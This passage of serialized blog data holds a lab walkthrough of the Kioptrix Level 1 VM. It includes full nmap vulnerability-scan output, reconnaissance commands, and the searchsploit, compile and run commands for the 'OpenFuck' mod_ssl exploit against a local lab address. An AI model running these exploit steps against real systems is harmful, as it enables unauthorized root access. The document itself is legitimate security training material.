SECURITYVULNS:VULN:1488 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488\n|       SECURITYVULNS:VULN:1474 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474\n|       SECURITYVULNS:VULN:1439 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439\n|       SECURITYVULNS:VULN:1344 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344\n|       SECURITYVULNS:VULN:1262 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262\n|_      SECURITYVULNS:VULN:1233 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-enum: \n|   /test.php: Test page\n|   /icons/: Potentially interesting directory w/ listing on &#39;apache/1.3.20&#39;\n|   /manual/: Potentially interesting directory w/ listing on &#39;apache/1.3.20&#39;\n|_  /usage/: Potentially interesting folder\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-trace: TRACE is enabled\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| ssl-dh-params: \n|   VULNERABLE:\n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       https://weakdh.org\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\n|       https://www.securityfocus.com/bid/74733\n|   \n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n| ssl-ccs-injection: \n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the \&quot;CCS Injection\&quot; vulnerability.\n|           \n|     References:\n|       http://www.openssl.org/news/secadv_20140605.txt\n|       http://www.cvedetails.com/cve/2014-0224\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA\n|     References:\n|       https://www.openssl.org/~bodo/ssl-poodle.pdf\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|_      https://www.securityfocus.com/bid/70574\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)\n|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)\n|_sslv2-drown: ERROR: Script execution failed (use -d to debug)\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:7C:3A:16 (VMware)\n\nHost script results:\n| smb-vuln-cve2009-3103: \n|   VULNERABLE:\n|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2009-3103\n|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,\n|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a\n|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE\n|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,\n|           aka \&quot;SMBv2 Negotiation Vulnerability.\&quot;\n|           \n|     Disclosure date: 2009-09-08\n|     References:\n|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 356.82 seconds`&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Kioptrix level 1.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]],&quot;digest&quot;:[0,&quot;f2d5afa6b934df10&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -T4 -sV -O 192.168.124.140 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.140 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.140 /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;method-1--samba\&quot;&gt;Method-1  Samba&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1--samba\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679306030928.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nAttentions please,meterpreter is not availiable\nIt’s root.There is no need to escalate privilege.&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;method-2-openfuck-mod_ssl-vulnerability\&quot;&gt;Method-2 OpenFuck mod_ssl vulnerability&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-2-openfuck-mod_ssl-vulnerability\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit mod_ssl 2.8.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366939593.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit -p 47080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366949376.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366954478.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nWe need install libssl-dev first.&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -o OpenFuck 47080.c -lcrypto&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./OpenFuck&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./OpenFuck 0x6b 192.168.124.140 443 -c 40&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;There are some errors in compile process.&lt;/p&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1678960944499.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1678960950947.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n`Nmap scan report for bogon (192.168.124.140)\nHost is up (0.0021s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| vulners:\n|   cpe:/a:openbsd:openssh:2.9p2:\n|       CVE-2002-0640   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0640\&quot;&gt;https://vulners.com/cve/CVE-2002-0640&lt;/a&gt;\n|       CVE-2002-0639   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0639\&quot;&gt;https://vulners.com/cve/CVE-2002-0639&lt;/a&gt;\n|       CVE-2002-0083   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0083\&quot;&gt;https://vulners.com/cve/CVE-2002-0083&lt;/a&gt;\n|       CVE-2011-2895   9.3     &lt;a href=\&quot;https://vulners.com/cve/CVE-2011-2895\&quot;&gt;https://vulners.com/cve/CVE-2011-2895&lt;/a&gt;\n|       CVE-2006-5051   9.3     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-5051\&quot;&gt;https://vulners.com/cve/CVE-2006-5051&lt;/a&gt;\n|       CVE-2006-4924   7.8     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-4924\&quot;&gt;https://vulners.com/cve/CVE-2006-4924&lt;/a&gt;\n|       CVE-2003-1562   7.6     &lt;a href=\&quot;https://vulners.com/cve/CVE-2003-1562\&quot;&gt;https://vulners.com/cve/CVE-2003-1562&lt;/a&gt;\n|       CVE-2010-4478   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2010-4478\&quot;&gt;https://vulners.com/cve/CVE-2010-4478&lt;/a&gt;\n|       CVE-2002-0575   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0575\&quot;&gt;https://vulners.com/cve/CVE-2002-0575&lt;/a&gt;\n|       CVE-2001-1459   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-1459\&quot;&gt;https://vulners.com/cve/CVE-2001-1459&lt;/a&gt;\n|       CVE-2001-1380   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-1380\&quot;&gt;https://vulners.com/cve/CVE-2001-1380&lt;/a&gt;\n|       CVE-2001-0816   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-0816\&quot;&gt;https://vulners.com/cve/CVE-2001-0816&lt;/a&gt;\n|       SECURITYVULNS:VULN:1956 7.2     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956&lt;/a&gt;\n|       CVE-2001-0529   7.2     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-0529\&quot;&gt;https://vulners.com/cve/CVE-2001-0529&lt;/a&gt;\n|       SSV:64479       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:64479\&quot;&gt;https://vulners.com/seebug/SSV:64479&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:6192        5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:6192\&quot;&gt;https://vulners.com/seebug/SSV:6192&lt;/a&gt;     &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:60656       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:60656\&quot;&gt;https://vulners.com/seebug/SSV:60656&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:16847       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:16847\&quot;&gt;https://vulners.com/seebug/SSV:16847&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       PACKETSTORM:73600       5.0     &lt;a href=\&quot;https://vulners.com/packetstorm/PACKETSTORM:73600\&quot;&gt;https://vulners.com/packetstorm/PACKETSTORM:73600&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       PACKETSTORM:54435       5.0     &lt;a href=\&quot;https://vulners.com/packetstorm/PACKETSTORM:54435\&quot;&gt;https://vulners.com/packetstorm/PACKETSTORM:54435&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    5.0     &lt;a href=\&quot;https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3\&quot;&gt;https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EDB-ID:3303     5.0     &lt;a href=\&quot;https://vulners.com/exploitdb/EDB-ID:3303\&quot;&gt;https://vulners.com/exploitdb/EDB-ID:3303&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       CVE-2010-5107   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2010-5107\&quot;&gt;https://vulners.com/cve/CVE-2010-5107&lt;/a&gt;\n|       CVE-2007-2243   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2007-2243\&quot;&gt;https://vulners.com/cve/CVE-2007-2243&lt;/a&gt;\n|       CVE-2006-5052   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-5052\&quot;&gt;https://vulners.com/cve/CVE-2006-5052&lt;/a&gt;\n|       SSV:66339       4.9     &lt;a href=\&quot;https://vulners.com/seebug/SSV:66339\&quot;&gt;https://vulners.com/seebug/SSV:66339&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:10777       4.9     &lt;a href=\&quot;https://vulners.com/seebug/SSV:10777\&quot;&gt;https://vulners.com/seebug/SSV:10777&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     &lt;a href=\&quot;https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3\&quot;&gt;https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EDB-ID:8163     4.9     &lt;a href=\&quot;https://vulners.com/exploitdb/EDB-ID:8163\&quot;&gt;https://vulners.com/exploitdb/EDB-ID:8163&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       CVE-2009-0537   4.9     &lt;a href=\&quot;https://vulners.com/cve/CVE-2009-0537\&quot;&gt;https://vulners.com/cve/CVE-2009-0537&lt;/a&gt;\n|       CVE-2012-0814   3.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2012-0814\&quot;&gt;https://vulners.com/cve/CVE-2012-0814&lt;/a&gt;\n|       CVE-2011-4327   2.1     &lt;a href=\&quot;https://vulners.com/cve/CVE-2011-4327\&quot;&gt;https://vulners.com/cve/CVE-2011-4327&lt;/a&gt;\n|       CVE-2008-3259   1.2     &lt;a href=\&quot;https://vulners.com/cve/CVE-2008-3259\&quot;&gt;https://vulners.com/cve/CVE-2008-3259&lt;/a&gt;\n|       SECURITYVULNS:VULN:1953 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953&lt;/a&gt;\n|       SECURITYVULNS:VULN:1608 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608&lt;/a&gt;\n|       SECURITYVULNS:VULN:1499 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499&lt;/a&gt;\n|       SECURITYVULNS:VULN:1488 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488&lt;/a&gt;\n|       SECURITYVULNS:VULN:1474 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474&lt;/a&gt;\n|       SECURITYVULNS:VULN:1439 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439&lt;/a&gt;\n|       SECURITYVULNS:VULN:1344 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344&lt;/a&gt;\n|       SECURITYVULNS:VULN:1262 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262&lt;/a&gt;\n|_      SECURITYVULNS:VULN:1233 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233&lt;/a&gt;\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-enum:\n|   /test.php: Test page\n|   /icons/: Potentially interesting directory w/ listing on ‘apache/1.3.20’\n|   /manual/: Potentially interesting directory w/ listing on ‘apache/1.3.20’\n|_  /usage/: Potentially interesting folder\n|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-trace: TRACE is enabled\n|&lt;em&gt;http-dombased-xss: Couldn’t find any DOM based XSS.\n|&lt;em&gt;http-csrf: Couldn’t find any CSRF vulnerabilities.\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|&lt;/em&gt;  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| ssl-dh-params:\n|   VULNERABLE:\n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.securityfocus.com/bid/74733\&quot;&gt;https://www.securityfocus.com/bid/74733&lt;/a&gt;\n|&lt;br&gt;\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|&lt;/em&gt;      &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n|&lt;em&gt;http-dombased-xss: Couldn’t find any DOM based XSS.\n| ssl-ccs-injection:\n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the “CCS Injection” vulnerability.\n|&lt;br&gt;\n|     References:\n|       &lt;a href=\&quot;http://www.openssl.org/news/secadv_20140605.txt\&quot;&gt;http://www.openssl.org/news/secadv_20140605.txt&lt;/a&gt;\n|       &lt;a href=\&quot;http://www.cvedetails.com/cve/2014-0224\&quot;&gt;http://www.cvedetails.com/cve/2014-0224&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224&lt;/a&gt;\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|&lt;em&gt;http-csrf: Couldn’t find any CSRF vulnerabilities.\n| ssl-poodle:\n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain 